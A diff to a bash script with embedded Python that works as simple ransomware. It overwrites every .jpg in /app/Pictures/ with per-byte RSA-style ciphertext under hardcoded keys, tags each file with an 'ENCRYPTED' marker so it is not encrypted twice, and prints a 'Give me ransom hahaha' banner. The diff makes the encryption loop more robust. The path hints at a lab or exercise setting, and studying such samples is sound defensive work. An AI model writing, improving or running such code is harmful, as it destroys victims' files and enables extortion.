@@ -1,26 +1,41 @@
 #!/usr/bin/env bash
 
-python3 <<EOF
-from os import listdir
+python3 << END
 import pickle
+from os import listdir
 
 n = 22291846172619859445381409012451
 e = 65535
 d = 14499309299673345844676003563183
+marker = b'ENCRYPTED'
 
-for file in listdir('/app/Pictures/'):
+# Check if a file has been encrypted
+def is_encrypted(filename):
+    with open(filename, 'rb') as file:
+        file.seek(-len(marker), 2)  # Go to the position before the marker
+        return file.read() == marker
+
+file_dir = '/app/Pictures/'
+
+for file in listdir(file_dir):
     if not file.endswith('.jpg'):
-        break
-    # encrypt
-    plain_bytes = b''
-    with open(f'/app/Pictures/{file}', 'rb') as f:
-        plain_bytes = f.read()
-    cipher = [pow(i, e, n) for i in plain_bytes]
-    with open(f'/app/Pictures/{file}', 'wb') as f:
-        pickle.dump(cipher, f)
-EOF
+        continue
+    filename = f'{file_dir}{file}'
+    if not is_encrypted(filename):
+        # print(f'Encrypting {filename}')
+        # encrypt
+        plain_bytes = b''
+        with open(filename, 'rb') as f:
+            plain_bytes = f.read()
+        cipher = [pow(i, e, n) for i in plain_bytes]
+        with open(filename, 'wb') as f:
+            pickle.dump(cipher, f)
+            f.write(marker)  # Add the marker at the end of the file
+END
 
-# Print Give me ransom haha!
-echo "Give me ransom haha!"
+echo "////////////////////////////////////////////////////////////////////////"
+echo "///////////////////////---------ERROR--------///////////////////////////"
+echo "////////////////---------Give me ransom hahaha---------/////////////////"
+echo "////////////////////////////////////////////////////////////////////////"
 
-exit
+exit 0
